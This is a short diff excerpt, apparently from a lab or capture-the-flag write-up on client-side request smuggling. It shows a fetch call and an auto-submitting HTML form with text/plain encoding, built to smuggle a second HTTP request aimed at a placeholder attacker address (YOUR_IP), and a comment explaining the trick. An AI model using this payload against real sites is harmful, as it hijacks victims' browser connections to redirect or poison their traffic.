@@ -35,11 +35,11 @@ fetch('http://MACHINE_IP:5000/', {    method: 'POST',    body: 'GET /redirect HT
 <>form id="btn" action="http://MACHINE_NAME.COM/"
     method="POST"
     enctype="text/plain">
-<textarea name="GET http://YOUR_IP HTTP/1.1
+<>textarea name="GET http://YOUR_IP HTTP/1.1
 AAA: A">placeholder1</textarea>
-<button type="submit">placeholder2</button>
+<>button type="submit">placeholder2</button>
 </form>
-<script> btn.submit() </script>
+<><script> btn.submit() </script>
 
 ### We utilize a form because it inherently supports a keep-alive connection by default. The type is used to avoid the default encoding MIME type since we don't want to encode the second malicious request.
 
